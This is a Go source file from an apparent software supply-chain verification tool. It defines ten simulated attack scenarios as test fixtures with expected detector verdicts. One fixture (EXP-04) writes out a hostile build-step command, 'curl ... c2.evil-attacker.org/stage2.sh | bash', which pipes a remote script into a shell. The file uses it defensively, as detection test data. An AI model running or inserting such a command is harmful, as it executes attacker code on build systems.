package experiment

import (
	"context"
	"time"

	"github.com/ramKarthik57/provenancex/internal/artifact"
	"github.com/ramKarthik57/provenancex/internal/correlation"
	"github.com/ramKarthik57/provenancex/internal/dependency"
	"github.com/ramKarthik57/provenancex/internal/environment"
	"github.com/ramKarthik57/provenancex/internal/evidence"
	"github.com/ramKarthik57/provenancex/internal/execution"
	"github.com/ramKarthik57/provenancex/internal/filesystem"
	"github.com/ramKarthik57/provenancex/internal/network"
	"github.com/ramKarthik57/provenancex/internal/process"
	"github.com/ramKarthik57/provenancex/internal/provenance"
	"github.com/ramKarthik57/provenancex/internal/repository"
	"github.com/ramKarthik57/provenancex/internal/sbom"
	"github.com/ramKarthik57/provenancex/internal/signature"
)

// DefaultScenarios returns the 10 controlled supply chain attack scenarios
func DefaultScenarios() []Scenario {
	return []Scenario{
		{
			ID:                 "EXP-01",
			Name:               "Source Code Tampering",
			Category:           "Source Integrity",
			Description:        "Simulates uncommitted stealth source code modifications or untracked backdoor files present during compilation.",
			TargetLayer:        evidence.LayerSource,
			ExpectedVerdict:    "WARNING",
			ExpectedBreakLayer: evidence.LayerSource,
			Simulate: func(ctx context.Context) (*correlation.CorrelationInput, error) {
				base := makeBaseCleanInput()
				base.Repository.IsClean = false
				base.Repository.UntrackedFiles = []string{"pkg/stealth/backdoor.go"}
				base.Repository.ModifiedFiles = []string{"cmd/main.go"}
				return base, nil
			},
		},
		{
			ID:                 "EXP-02",
			Name:               "Dependency Substitution & Typosquatting",
			Category:           "Dependency Integrity",
			Description:        "Simulates malicious dependency replacement where lockfile records an unexpected version or tampered package.",
			TargetLayer:        evidence.LayerDependencies,
			ExpectedVerdict:    "REJECTED",
			ExpectedBreakLayer: evidence.LayerDependencies,
			Simulate: func(ctx context.Context) (*correlation.CorrelationInput, error) {
				base := makeBaseCleanInput()
				base.Dependencies.IsConsistent = false
				base.Dependencies.Mismatches = []*dependency.Mismatch{
					{
						Package:     "cryptography",
						Expected:    "42.0.5",
						Observed:    "42.0.5-backdoor.1",
						Description: "Lockfile resolves unexpected package version differing from declaration",
					},
				}
				return base, nil
			},
		},
		{
			ID:                 "EXP-03",
			Name:               "Unpinned Floating Dependencies",
			Category:           "Dependency Integrity",
			Description:        "Simulates omitting dependency lockfiles leading to indeterminate package resolution.",
			TargetLayer:        evidence.LayerDependencies,
			ExpectedVerdict:    "WARNING",
			ExpectedBreakLayer: evidence.LayerDependencies,
			Simulate: func(ctx context.Context) (*correlation.CorrelationInput, error) {
				base := makeBaseCleanInput()
				base.Dependencies.HasLockfile = false
				base.Dependencies.IsConsistent = false
				return base, nil
			},
		},
		{
			ID:                 "EXP-04",
			Name:               "Build Process Injection",
			Category:           "Build Execution",
			Description:        "Simulates an in-flight build step spawning an unauthorized process (e.g. curl exfiltration to shell).",
			TargetLayer:        evidence.LayerProcess,
			ExpectedVerdict:    "REJECTED",
			ExpectedBreakLayer: evidence.LayerProcess,
			Simulate: func(ctx context.Context) (*correlation.CorrelationInput, error) {
				base := makeBaseCleanInput()
				base.ProcessTree.SuspiciousCount = 1
				base.ProcessTree.Processes = append(base.ProcessTree.Processes, &process.ProcessNode{
					PID:          9999,
					Name:         "curl",
					CommandLine:  "curl -s http://c2.evil-attacker.org/stage2.sh | bash",
					IsSuspicious: true,
					AlertReason:  "Suspicious execution: unauthorized shell download pipe",
				})
				return base, nil
			},
		},
		{
			ID:                 "EXP-05",
			Name:               "Build Stage Execution Failure",
			Category:           "Build Execution",
			Description:        "Simulates a tampered build script crashing or exiting with non-zero status.",
			TargetLayer:        evidence.LayerBuild,
			ExpectedVerdict:    "REJECTED",
			ExpectedBreakLayer: evidence.LayerBuild,
			Simulate: func(ctx context.Context) (*correlation.CorrelationInput, error) {
				base := makeBaseCleanInput()
				base.Execution.Success = false
				base.Execution.ExitCode = 1
				base.Execution.Error = "compiler crashed with SIGSEGV during code injection"
				return base, nil
			},
		},
		{
			ID:                 "EXP-06",
			Name:               "Unexpected Filesystem Input Injection",
			Category:           "Filesystem Boundary",
			Description:        "Simulates unexpected external configuration or secret payloads introduced outside declared repository bounds.",
			TargetLayer:        evidence.LayerFilesystem,
			ExpectedVerdict:    "REJECTED",
			ExpectedBreakLayer: evidence.LayerFilesystem,
			Simulate: func(ctx context.Context) (*correlation.CorrelationInput, error) {
				base := makeBaseCleanInput()
				base.InputEvaluation = &filesystem.InputEvaluation{
					UnexpectedInputs: []string{".stealth_credentials.env"},
				}
				return base, nil
			},
		},
		{
			ID:                 "EXP-07",
			Name:               "Unauthorized Network Egress",
			Category:           "Network Egress",
			Description:        "Simulates build script opening socket connections to unapproved remote servers or C2 infrastructure.",
			TargetLayer:        evidence.LayerNetwork,
			ExpectedVerdict:    "REJECTED",
			ExpectedBreakLayer: evidence.LayerNetwork,
			Simulate: func(ctx context.Context) (*correlation.CorrelationInput, error) {
				base := makeBaseCleanInput()
				base.NetworkAudit.IsPolicyCompliant = false
				base.NetworkAudit.ViolationCount = 1
				base.NetworkAudit.Violations = []*network.ConnectionRecord{
					{
						Destination: "198.51.100.89",
						Port:        8080,
						IsAllowed:   false,
						AlertReason: "Unauthorized egress: IP not present in permitted registry allowlist",
					},
				}
				return base, nil
			},
		},
		{
			ID:                 "EXP-08",
			Name:               "SBOM Component Discrepancy",
			Category:           "Attestation / SBOM",
			Description:        "Simulates SBOM claiming safe dependencies while actual build resolved undocumented packages.",
			TargetLayer:        evidence.LayerSBOM,
			ExpectedVerdict:    "REJECTED",
			ExpectedBreakLayer: evidence.LayerSBOM,
			Simulate: func(ctx context.Context) (*correlation.CorrelationInput, error) {
				base := makeBaseCleanInput()
				// SBOM declares 0 components while dependencies has components
				base.SBOM = &sbom.Document{
					Format:     sbom.FormatCycloneDX,
					Version:    "1.5",
					Components: []*sbom.Component{},
				}
				return base, nil
			},
		},
		{
			ID:                 "EXP-09",
			Name:               "Provenance Subject Contradiction",
			Category:           "Provenance & SLSA",
			Description:        "Simulates in-toto SLSA attestation declaring an artifact SHA-256 that contradicts the actual binary digest.",
			TargetLayer:        evidence.LayerProvenance,
			ExpectedVerdict:    "REJECTED",
			ExpectedBreakLayer: evidence.LayerProvenance,
			Simulate: func(ctx context.Context) (*correlation.CorrelationInput, error) {
				base := makeBaseCleanInput()
				base.Provenance = &provenance.InTotoStatement{
					Type:          provenance.InTotoStatementV1,
					PredicateType: provenance.SLSAProvenanceV1,
					Subject: []provenance.Subject{
						{
							Name: "production-app",
							Digest: map[string]string{
								"sha256": "0000000000000000000000000000000000000000000000000000000000000000",
							},
						},
					},
					Predicate: provenance.SLSAv1Predicate{
						RunDetails: provenance.RunDetails{
							Builder: provenance.BuilderMetadata{ID: "https://provenancex.dev/builder/isolated-runner@v1"},
						},
					},
				}
				return base, nil
			},
		},
		{
			ID:                 "EXP-10",
			Name:               "Cryptographic Signature Forgery",
			Category:           "Digital Signature",
			Description:        "Simulates digital signature verification failure caused by forged signature or payload tampering.",
			TargetLayer:        evidence.LayerSignature,
			ExpectedVerdict:    "REJECTED",
			ExpectedBreakLayer: evidence.LayerSignature,
			Simulate: func(ctx context.Context) (*correlation.CorrelationInput, error) {
				base := makeBaseCleanInput()
				base.Signature = &signature.VerificationResult{
					Valid:       false,
					Algorithm:   signature.AlgoECDSAP256,
					Error:       "ECDSA signature verification failed: signature or payload mismatch",
					Distinction: signature.ArtifactTypeSignature,
				}
				return base, nil
			},
		},
	}
}

func makeBaseCleanInput() *correlation.CorrelationInput {
	artHash := "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
	return &correlation.CorrelationInput{
		Repository: &repository.State{
			Branch:         "main",
			CommitSHA:      "c0ffee1234567890abcdef1234567890abcdef12",
			IsClean:        true,
			UntrackedFiles: []string{},
			ModifiedFiles:  []string{},
		},
		Dependencies: &dependency.Report{
			DirectCount:  1,
			HasLockfile:  true,
			IsConsistent: true,
			Dependencies: []*dependency.Dependency{
				{Name: "cryptography", Version: "42.0.5", Ecosystem: dependency.EcosystemPython},
			},
			Mismatches: []*dependency.Mismatch{},
		},
		Environment: &environment.Fingerprint{
			OS:              "linux",
			Architecture:    "amd64",
			Tools:           []environment.ToolVersion{{Name: "go", Version: "go1.23.6", Path: "/usr/bin/go"}},
			FingerprintHash: "fp-clean-1234",
		},
		Execution: &execution.StageExecution{
			Name:            "build",
			Success:         true,
			ExitCode:        0,
			Duration:        2 * time.Second,
			RedactedCommand: "go build -trimpath",
			RedactedArgs:    []string{"-trimpath", "-o", "production-app"},
		},
		ProcessTree: &process.Tree{
			SuspiciousCount: 0,
			Processes: []*process.ProcessNode{
				{PID: 1001, Name: "go", CommandLine: "go build -trimpath -o production-app", IsSuspicious: false},
			},
		},
		InputEvaluation: &filesystem.InputEvaluation{
			UnexpectedInputs: []string{},
			MissingInputs:    []string{},
		},
		NetworkAudit: &network.Evaluation{
			TotalConnections:  1,
			ViolationCount:    0,
			IsPolicyCompliant: true,
			Violations:        []*network.ConnectionRecord{},
		},
		Artifact: &artifact.Metadata{
			Name:     "production-app",
			SHA256:   artHash,
			Size:     2048,
			MIMEType: "application/octet-stream",
		},
		SBOM: &sbom.Document{
			Format:  sbom.FormatCycloneDX,
			Version: "1.5",
			Components: []*sbom.Component{
				{Name: "cryptography", Version: "42.0.5", PURL: "pkg:pypi/cryptography@42.0.5"},
			},
		},
		Provenance: &provenance.InTotoStatement{
			Type:          provenance.InTotoStatementV1,
			PredicateType: provenance.SLSAProvenanceV1,
			Subject: []provenance.Subject{
				{
					Name:   "production-app",
					Digest: map[string]string{"sha256": artHash},
				},
			},
			Predicate: provenance.SLSAv1Predicate{
				RunDetails: provenance.RunDetails{
					Builder: provenance.BuilderMetadata{ID: "https://provenancex.dev/builder/isolated-runner@v1"},
				},
			},
		},
		Signature: &signature.VerificationResult{
			Valid:       true,
			Algorithm:   signature.AlgoECDSAP256,
			Distinction: signature.ArtifactTypeSignature,
		},
	}
}
